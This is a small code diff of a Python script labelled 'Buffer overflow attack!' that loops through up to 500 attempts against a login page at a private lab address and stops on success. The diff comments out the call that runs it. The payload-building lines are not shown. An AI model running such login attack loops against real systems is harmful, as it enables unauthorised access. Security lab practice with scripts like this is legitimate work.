@@ -1,12 +1,10 @@
 import requests
 import json
 
-
 def overflow():
     print("Buffer overflow attack! ")
     url = 'http://10.13.13.254/login'
     ses = requests.session()
-
     # set an index to loop thorugh
     overflow_range = range(0, 500, 1)
     for overflow in overflow_range:
@@ -23,5 +21,5 @@ def overflow():
                 print("success!")
                 break
 
-if __name__ == "__main__":
-    overflow()
+#if __name__ == "__main__":
+ #   overflow()
